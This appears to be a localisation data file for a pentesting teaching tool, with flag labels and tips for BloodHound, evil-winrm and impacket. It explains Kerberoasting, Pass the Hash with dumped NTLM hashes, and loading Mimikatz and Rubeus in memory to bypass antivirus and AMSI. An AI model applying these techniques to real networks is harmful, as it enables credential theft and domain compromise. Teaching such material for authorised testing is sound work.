Kerberoastable Accounts.example: In BloodHound GUI: Analysis → Find all Kerberoastable Users
Kerberoastable Accounts.teach: Kerberoastable accounts have SPNs — request their service tickets, extract, crack offline. Service accounts often have weak passwords and excessive privileges.

--dns-tcp.label: --dns-tcp
--dns-tcp.teach: Use TCP for DNS (if UDP fails)

output_read.meaning: the attack path you want
full control over that object — huge privilege
can modify permissions — abuse to grant yourself GenericAll
right to pull all password hashes from the DC
extract their hashes offline without admin

bloodhound.teach_alt: Active Directory attack path mapper — visualizes paths to Domain Admin

evil-winrm.description: Windows Remote Management shell for pentesting. Provides a fully functional PowerShell session with extra features: file upload/download, in-memory .NET assembly loading, Pass the Hash, Kerberos auth, and bypass for AMSI and logging.
evil-winrm.teach_intro: WinRM is Windows' built-in remote management protocol on port 5985/5986. Evil-WinRM connects to it and gives you a feature-rich shell. It's cleaner than a reverse Meterpreter session for interactive work — you get tab completion, history, and PowerShell's full power.

-i.label: Target IP
-i.teach: WinRM must be enabled on the target (it's on by default on Windows Server 2012+). Port 5985 (HTTP) or 5986 (HTTPS).

-u.label: Username
-u.teach: Any user with WinRM access works. Local admins, domain admins, and users in the Remote Management Users group.

-p.label: Password
-p.teach: Plaintext password authentication. If you have an NTLM hash instead, use -H for Pass the Hash.

-H.label: NT Hash (Pass the Hash)
-H.desc: Authenticate using NTLM hash instead of plaintext password.
-H.teach: Pass the Hash — no password needed! Dump the NTLM hash with mimikatz or secretsdump, pass it directly here. No cracking required.

-s.label: PS Scripts Path
-s.desc: Path to PowerShell scripts to load in memory.
-s.teach: Scripts are loaded into memory without touching disk. Invoke-Mimikatz, PowerView, AMSI bypass scripts — all available via tab completion.

-e.label: .NET Executables Path
-e.desc: Path to .NET executables to load via Invoke-Binary.
-e.teach: Load SharpHound, Rubeus, SafetyKatz entirely in memory using Invoke-Binary. Never touches disk — bypasses AV file scanning.

impacket.description: Python library and collection of tools for Windows protocol attacks. Key tools: secretsdump (dump hashes), psexec (remote shell), wmiexec (WMI shell), smbclient (browse shares), GetUserSPNs (Kerberoasting), GetNPUsers (AS-REP roasting).
